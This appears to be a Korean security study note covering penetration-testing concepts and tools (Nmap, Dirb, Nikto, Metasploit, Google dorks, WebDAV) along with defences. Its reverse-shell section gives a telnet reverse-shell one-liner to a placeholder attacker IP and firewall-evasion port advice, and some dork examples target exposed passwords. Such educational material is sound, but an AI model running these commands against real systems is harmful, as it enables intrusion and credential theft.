---
title: "Application Security"
---
#애플리케이션 보안

## 정의
- 모의 해킹(Penetration Testing)은 실제 해킹 공격을 모방하여 시스템, 네트워크, 애플리케이션 등의 보안 취약점을 식별하고 평가하는 과정
- 이를 통해 취약점이 악용되기 전에 보완하고, 조직의 보안 상태를 현실적인 관점에서 평가 및 강화

## 특징
1. **실제 공격 시뮬레이션**: 해커의 공격 방식을 모방하여 시스템의 취약점을 테스트.
2. **보안 평가와 개선**: 취약점 발견 후 이를 보완하여 방어 능력을 강화.
3. **리스크 관리**: 잠재적인 보안 위협을 사전에 발견하고 대응책 마련.

---

# 포트 포워딩 및 브리지

## 포트 포워딩
- 외부 네트워크에서 내부 네트워크의 특정 포트로 연결을 전달하는 기술.
- 주로 NAT 환경에서 내부 서버에 대한 접근을 제공하기 위해 사용.
- **장점**:
  - 원격 기기 액세스 가능.
  - 인터넷 연결 속도 개선.
- **단점**:
  - 보안 취약점 발생 가능.

## 브리지(Bridge)
- 두 개 이상의 네트워크를 하나의 네트워크처럼 연결하여 통신할 수 있게 하는 소프트웨어 장치 또는 설정.
- **특징**:
  - 패킷의 소스 및 대상 주소를 확인하여 데이터 전송 경로를 결정.
  - 가상 머신과 물리적 네트워크 간 연결을 지원.

---

# OSINT 검색 서비스

## 정의
- OSINT(Open-Source Intelligence)는 공개적으로 사용 가능한 소스에서 정보를 수집하고 분석하여 인텔리전스를 도출하는 서비스

- 주요 활용처:
  - 사이버 범죄 활동 탐지.
  - 경쟁사 분석 및 시장 조사.
  - 법 집행 및 범죄자 추적.

## 활용 예시
1. 소셜 미디어, 웹사이트, 공개 데이터베이스 등을 통한 정보 수집.
2. Shodan과 같은 도구를 활용해 시스템 배너 정보 및 네트워크 상태 분석.

---

# 구글 해킹 (Google Hacking)

## 정의
- 구글 검색 엔진을 활용하여 민감한 정보나 취약점을 가진 페이지를 검색하는 기술.
- 특정 검색 연산자를 사용해 데이터를 필터링하여 필요한 정보를 효율적으로 탐색.

## 주요 검색 연산자
1. `"검색어"`: 정확히 일치하는 단어나 문구 검색.
   - 예: `"password"`
2. `intitle:`: 웹 페이지 제목에 특정 단어가 포함된 결과 검색.
   - 예: `intitle:"index of"`
3. `inurl:`: URL에 특정 키워드가 포함된 페이지 검색.
   - 예: `inurl:"admin"`
4. `filetype:`: 특정 파일 형식만 검색.
   - 예: `filetype:xls "비밀번호"`
5. `site:`: 특정 도메인 내에서만 검색.
   - 예: `site:example.com`
6. `intext:`: 웹 페이지 본문에 특정 키워드가 포함된 결과 검색.

## 대응 방안
1. **robots.txt 설정**: 민감한 디렉토리나 파일이 검색되지 않도록 크롤러 접근 제한.
2. **데이터 암호화**: 전송 및 저장 데이터를 암호화하여 무단 접근 방지.
3. **취약점 점검 도구 활용**:
   - OWASP ZAP, Nessus 등으로 취약점 발견 및 대응.

---

# 포트 스캔 및 Nmap

## Nmap
- 네트워크 탐색 및 보안 감사용으로 널리 사용되는 포트 스캐너.

### 주요 옵션
1. `-p`: 스캔할 포트를 지정 (`-p-`로 모든 포트를 스캔 가능).
2. `-sV`: 실행 중인 서비스 버전을 탐지.
3. `-oX`: 스캔 결과를 XML 형식으로 저장.

### Nmap NSE (Nmap Scripting Engine)
#### 기능
1. 서비스 및 버전 탐지.
2. 취약점 스캔.
3. 네트워크 정책 준수 확인.
4. 추가 정보 수집 (WHOIS 정보, 공유 폴더 목록 등).

#### 카테고리
1. **auth**: 인증 관련 테스트 수행.
2. **vuln**: 취약점 탐지 스크립트.
3. **discovery**: 네트워크 및 호스트 정보 수집.
4. **safe**: 시스템에 영향을 주지 않는 안전한 스크립트.
5. **intrusive**: 시스템에 영향을 줄 수 있는 공격적인 스크립트.

#### 예시 명령어
1. 서비스 버전 및 스크립트 스캔:
   ```
   nmap -sV --script=vuln target_ip
   ```
2. 특정 포트 스캔:
   ```
   nmap -p 80,443 target_ip
   ```

---

# DMZ (Demilitarized Zone)

## 정의
- 내부 네트워크와 외부 네트워크 사이에 위치한 서브네트워크로, 외부에서 접근 가능한 서비스를 안전하게 운영할 수 있는 환경 제공.
- DMZ를 통해 내부 네트워크를 보호하면서 외부에 서비스를 제공합니다.

---

# 보안 장비의 동작 계층

| 장비 | 동작 계층 | 주요 기능 |
|------|-----------|----------|
| 방화벽(Firewall) | OSI 모델 3~7계층 | IP 주소, 포트 번호, 애플리케이션 데이터 기반 트래픽 제어 |
| IDS | OSI 모델 2~7계층 | 침입 시도 탐지 및 경고 |
| IPS | OSI 모델 2~7계층 | 침입 시도 탐지 + 실시간 차단 |

---

# 추가로 알아두면 좋은 내용

## IDS와 IPS의 차이점

| 구분 | IDS | IPS |
|------|-----|-----|
| 주요 기능 | 침입 시도 탐지 | 침입 시도 탐지 및 실시간 대응 |
| 동작 방식 | 관리자에게 경고 전송 | 즉시 차단 또는 격리 |
| 실시간 보호 | X | O |

---

# 정기적인 보안 평가의 중요성

## 목적
새로운 취약점이나 보안 위협을 조기에 발견하고 대응하기 위함.

## 방법
1. 취약점 스캔:
   - 자동화된 도구로 시스템 취약점 탐색.
2. 모의 해킹:
   - 실제 공격 시나리오 기반으로 보안성 테스트.
3. 보안 정책 검토:
   - 현재 보안 정책과 절차 검토 및 개선점 도출.

---

# 네트워크 분할 및 접근 제어

## 네트워크 분할
- 중요 자산 보호를 위해 네트워크를 여러 영역으로 분할하여 무단 접근 방지.

## 접근 제어 목록(ACL)
- 트래픽 허용/차단 규칙 정의로 네트워크 보안 강화.
---
# CVE와 CWE

## CVE (Common Vulnerabilities and Exposures)
- 특정 소프트웨어에서 발생하는 구체적인 보안 문제를 식별하고 공유하기 위한 표준화된 식별자
- **예시**: 특정 버전의 소프트웨어에서 발생하는 버퍼 오버플로우 취약점.

## CWE (Common Weakness Enumeration)
- 개별 취약점이 아닌, 취약점이 발생하는 근본적인 원인이나 패턴을 정의한다.
- 보안 교육 및 예방을 위한 목적으로 사용된다.
- **예시**: 입력 검증 부족으로 인한 버퍼 오버플로우 취약점 유형.

---

# Dirb

## 개요
- 웹 서버에서 숨겨진 파일과 디렉토리를 탐지하기 위한 콘텐츠 발견 도구이다.
- 사전을 기반으로 브루트 포스 기법을 사용하여 웹 서버를 스캔한다.

## 작동 원리
1. **사전 기반 검색**:
   - 사용자가 제공한 단어 리스트를 사용하여 다양한 URL 경로에 요청을 보낸다.
2. **응답 코드 분석**:
   - 서버의 응답 코드를 분석하여 존재하는 파일이나 디렉토리를 식별한다.

## 활용 방안
- 웹 애플리케이션의 숨겨진 경로 탐색에 사용한다.
- 디렉토리 인덱싱이 비활성화된 경우 파일 구조를 파악한다.
- 보안 취약점 탐지의 사전 단계로 활용한다.

---

# Nikto

## 개요
- 웹 서버 및 웹 애플리케이션의 알려진 취약점, 잘못된 설정, 보안 문제를 탐지하는 오픈 소스 스캐너이다.
- 광범위한 취약점 데이터베이스를 기반으로 스캔을 수행한다.

## 사용 방법
- 기본 명령어: `nikto -h <target_url>`

## 활용 분야
1. **웹 서버 취약점 평가**:
   - 서버 소프트웨어의 알려진 취약점을 탐지한다.
2. **웹 애플리케이션 보안 테스트**:
   - 일반적인 애플리케이션 취약점 및 부적절한 설정을 점검한다.
3. **SSL/TLS 구성 검토**:
   - SSL/TLS 설정의 안전성과 인증서 유효성을 확인한다.
4. **기본 파일 및 디렉토리 탐지**:
   - 기본 설치 파일이나 백업 파일의 존재 여부를 확인한다.

---

# 리버스 쉘 공격

## 개념
- 피해자의 시스템이 공격자의 시스템으로 연결을 시작하도록 유도하여 원격 접근을 획득하는 공격 기법이다.
- 방화벽이나 NAT와 같은 보안 장치를 우회할 수 있다.

## 공격 단계
1. **공격자 리스너 설정**:
   - 공격자는 자신의 시스템에서 특정 포트로의 연결을 수신 대기한다.
   - 명령어 예시: `nc -lvp 4444`
2. **취약점 활용 및 페이로드 전달**:
   - 피해 시스템의 취약점을 이용하거나 악성 코드를 실행하여 리버스 쉘 페이로드를 전달한다.
3. **피해자 시스템의 연결 수립**:
   - 피해자는 공격자의 IP와 포트로 아웃바운드 연결을 생성한다.
   - 일반적으로 `nc`를 사용하여 연결을 수행한다.
4. **공격자의 쉘 접근 획득**:
   - 연결이 성립되면 공격자는 피해 시스템에서 명령을 실행할 수 있다.

## 포트 선택의 중요성
- 비표준 포트(예: 4444)는 방화벽에 의해 차단될 수 있다.
- 이 경우 80(HTTP), 443(HTTPS), 8080 등 일반적으로 허용되는 포트로 변경하여 우회할 수 있다.

## Netcat의 한계점과 개선 방안
- Netcat은 단일 TCP 연결로 입출력을 처리하므로 세션이 불안정할 수 있다.
- Telnet을 이용한 안정적인 리버스 쉘:
  ```
  sleep 5000 | telnet 공격자_IP 4444 | /bin/sh | telnet 공격자_IP 5555
  ```
  - `sleep` 명령은 세션을 유지하기 위한 보조 역할을 한다.

---

# 메타스플로잇 프레임워크를 활용한 자동화 공격

## 소개
- Metasploit Framework는 보안 취약점 연구와 개발을 위한 오픈 소스 플랫폼이다.
- 다양한 익스플로잇 모듈을 제공하여 자동화된 취약점 탐지와 공격을 수행할 수 있다.

## 주요 기능
1. **탐색**: 대상 시스템의 정보를 수집하고 취약점을 식별한다.
2. **익스플로잇**: 적합한 익스플로잇 모듈을 사용하여 공격을 실행한다.
3. **페이로드**: 공격 후 실행할 코드를 지정한다.
4. **포스트 모듈**: 공격 성공 후 추가적인 작업(예: 권한 상승)을 수행한다.

---

# WebDAV 취약점

## 개요
- WebDAV(Web Distributed Authoring and Versioning)는 HTTP 프로토콜의 확장으로, 웹 콘텐츠를 작성하고 관리하기 위한 기능을 제공한다.
- 잘못된 구성이나 보안 설정 부족으로 인해 취약점이 발생할 수 있다.

## 주요 취약점 및 위험성
1. **익명 쓰기 권한 허용**:
   - 인증 없이 파일 업로드 및 수정이 가능하면 공격자는 웹 쉘 등을 업로드하여 서버를 제어할 수 있다.
2. **과도한 권한 부여**:
   - 불필요한 쓰기, 삭제 권한은 권한 상승이나 데이터 유출로 이어질 수 있다.
3. **디렉토리 인덱싱 활성화**:
   - 서버의 파일 구조가 노출되어 공격에 이용될 수 있다.

## 보안 강화 방안
1. **인증 설정 강화**:
   - WebDAV 접근 시 강력한 인증 메커니즘을 적용한다.
2. **권한 관리**:
   - 최소 권한 원칙에 따라 필요한 권한만 부여한다.
   - 민감한 디렉토리와 파일에 대한 접근을 제한한다.
3. **접근 제어 목록(ACL) 활용**:
   - 사용자별 또는 그룹별로 세분화된 접근 권한을 설정한다.
4. **SSL/TLS 적용**:
   - 데이터 전송 시 암호화를 통해 도청 및 중간자 공격을 방지한다.
5. **사용하지 않는 경우 비활성화**:
   - WebDAV 기능이 필요하지 않다면 비활성화하여 공격 표면을 줄인다.

---

## 리버스 쉘 공격에 대한 방어
1. 이상 트래픽 감지 시스템 사용:
   - IDS/IPS를 통해 비정상적인 네트워크 활동을 모니터링하고 차단한다.
2. 아웃바운드 트래픽 관리:
   - 방화벽에서 아웃바운드 트래픽을 제어하여 불필요한 외부 연결을 제한한다.
3. 포트 및 프로토콜 검토:
   - 일반적으로 사용되지 않는 포트의 트래픽을 감시한다.
4. 보안 패치 적용:
   - 소프트웨어의 최신 보안 업데이트를 적용하여 알려진 취약점을 제거한다.

